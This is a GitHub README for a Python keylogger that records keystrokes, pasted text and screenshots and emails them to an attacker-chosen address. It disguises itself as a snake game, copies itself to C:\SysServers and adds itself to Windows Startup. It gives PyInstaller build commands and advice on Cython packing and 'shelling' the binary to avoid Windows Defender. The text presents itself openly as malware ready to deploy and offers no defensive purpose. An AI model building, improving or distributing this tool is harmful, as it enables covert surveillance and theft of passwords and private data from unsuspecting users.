## **An advanced keylogger implemented in Python**
### **Features**
- Record the output of the full keyboard
- Also record the content of the paste action
- Take a screenshot every time user switch between windows
- Packaged and collected information sent to a specified email address
- It will copy itself to the C: drive
  - C:\SysServers
- Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
- Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
- There is a Backdoor, Press "F12" to terminate the program, otherwise you need to go to the task manager to terminate the "system.exe"
### **Usage**
**System requirements**
- MS Windows (tested on 10)
- Python 2.7

**Modifiable parameters**  
- `Packing_interval` 
  - How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.  
- `email_sender` & `email_password`
  - Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.
- `receivers`
  - Email address for receiving packaged information

**Quick start**
1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
2. `cd Key-paste-screen-logger`
3. `pip install pyinstaller`
4. `pyinstaller -F -w -n snake -i Snake.ico system.py`
5. `cd dist/ && ./snake.exe `

**Advanced Packing**
- Use Cython to convert programs to C for faster execution and encryption.
- It is also useful to shell the program to avoid being killed by Windows Defender Security Center.
- You may need to install the corresponding Python version of Visual Studio to successfully convert py to pyd, otherwise it will report "Unable to find vcvarsall.bat" error
1. `pip install Cython`
2. `python shell.py build_ext --inplace`
3. `pyinstaller -F -w -n snake -i Snake.ico index.py`
4. `cd dist/ && ./snake.exe `
